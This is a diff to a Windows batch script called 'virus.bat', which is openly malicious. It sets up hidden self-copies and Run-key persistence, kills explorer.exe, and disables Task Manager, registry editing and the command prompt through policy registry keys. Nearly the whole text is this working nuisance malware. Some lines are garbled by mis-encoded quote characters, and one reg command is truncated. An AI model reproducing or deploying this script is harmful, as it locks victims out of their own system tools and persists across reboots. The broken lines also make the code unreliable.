@@ -1,15 +1,14 @@
 md c:\looser
 echo start c:\looser\virus.bat>c:\looser\virus.bat
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v virus /d c:\looser\virus.bat
-attrib +h +s c:\looser
-attrib +h +s c:\looser\virus.bat
-start c:\looser\virus.bat
+attrib +r +h +s c:\looser
+attrib +r +h +s c:\looser\virus.bat
 @echo off
 color 0
 taskkill /im explorer.exe /f > nul
 copy %0 C:\Windows\Win32.bat > nul
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v
-reg add «HKCU\Software\Microsoft\Windows\CurrentVersion\Run» /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f
+reg add Â«HKCU\Software\Microsoft\Windows\CurrentVersion\RunÂ» /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 2 /f > nul
